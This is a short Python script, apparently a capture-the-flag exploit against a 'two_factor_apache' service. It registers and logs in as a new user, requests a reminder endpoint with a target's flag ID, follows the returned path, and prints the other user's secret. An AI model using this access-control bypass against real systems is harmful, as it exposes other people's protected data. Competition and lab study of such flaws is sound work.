"""abcd"""

import logging
import sys


from checker.two_factor_apache.lib import Session


def main():
    logging.basicConfig(level=logging.DEBUG)

    sess = Session(logging, ip)
    sess.register()
    sess.login()

    r = sess.session.get(sess.make_url('/public/reminder', flag_id))
    r.raise_for_status()
    r = sess.session.get(sess.make_url(r.text, flag_id))
    r.raise_for_status()
    print(r.text)


if __name__ == '__main__':
    ip, flag_id = tuple(sys.argv[1:])
    main()
